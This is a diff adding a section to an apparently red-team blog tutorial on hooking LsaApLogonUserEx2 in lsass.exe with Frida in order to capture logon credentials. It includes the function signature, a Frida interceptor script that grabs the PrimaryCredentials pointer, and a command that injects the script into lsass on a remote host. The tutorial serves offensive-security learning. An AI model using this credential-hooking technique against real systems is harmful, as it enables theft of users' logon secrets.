@@ -56,7 +56,56 @@ We leave this running while we invoke an interactive logon somewhere on the targ
 
 ![a screenshot of various hooked functions including LsaApLogonUserEx2](/img/tracing-msv1_0.png)
 
-I decided to go with the obvious choice here, and target the `LsaApLogonUserEx2()` function. Luckily for us, this function is actually [documented in the MSDN](https://docs.microsoft.com/en-us/windows/win32/api/ntsecpkg/nc-ntsecpkg-lsa_ap_logon_user_ex2). That will make hooking it a lot easier, as we know exactly what the arguments and return values are.
+I decided to go with the obvious choice here, and target the `LsaApLogonUserEx2()` function. Luckily for us, this function is actually [documented in the MSDN](https://docs.microsoft.com/en-us/windows/win32/api/ntsecpkg/nc-ntsecpkg-lsa_ap_logon_user_ex2). That will make hooking it a lot easier, as we know exactly what the arguments and expected return values are.
+
+```text
+LSA_AP_LOGON_USER_EX2 LsaApLogonUserEx2;
+
+NTSTATUS LsaApLogonUserEx2(
+  [in]  PLSA_CLIENT_REQUEST ClientRequest,
+  [in]  SECURITY_LOGON_TYPE LogonType,
+  [in]  PVOID ProtocolSubmitBuffer,
+  [in]  PVOID ClientBufferBase,
+  [in]  ULONG SubmitBufferSize,
+  [out] PVOID *ProfileBuffer,
+  [out] PULONG ProfileBufferSize,
+  [out] PLUID LogonId,
+  [out] PNTSTATUS SubStatus,
+  [out] PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
+  [out] PVOID *TokenInformation,
+  [out] PUNICODE_STRING *AccountName,
+  [out] PUNICODE_STRING *AuthenticatingAuthority,
+  [out] PUNICODE_STRING *MachineName,
+  [out] PSECPKG_PRIMARY_CRED PrimaryCredentials,
+  [out] PSECPKG_SUPPLEMENTAL_CRED_ARRAY *SupplementalCredentials
+)
+```
+
+Armed with this information, we can see that the thing we probably care about is the `PrimaryCredentials` variable, which is the 15th argument passed to the function. Now we know enough to write our own Frida script:
+
+```text
+var msv = Process.getModuleByName("msv1_0.DLL");
+var logonUser = msv.getExportByName("LsaApLogonUserEx2");
+
+Interceptor.attach(logonUser, {
+	onEnter: function(args) {
+		this.primaryCredentials = args[14];
+	},
+	onLeave: function(retval) {
+		console.log("Address of primary credentials is " + this.primaryCredentials);
+	}
+});
+```
+
+So far, the script it pretty simple. We identify the address of the function and attach to it with Frida's interceptor. When the function is entered, we save the address of the PrimaryCredentials array. When the function exits, we print the address. To test it out, simply inject the script into Frida:
+
+```bash
+$ frida -H 192.168.1.120 lsass.exe -l LsaApLogonUserEx2.js
+```
+
+And invoke another interactive logon.
+
+## Step 3: Parsing PrimaryCredentials
 
 
 <!--
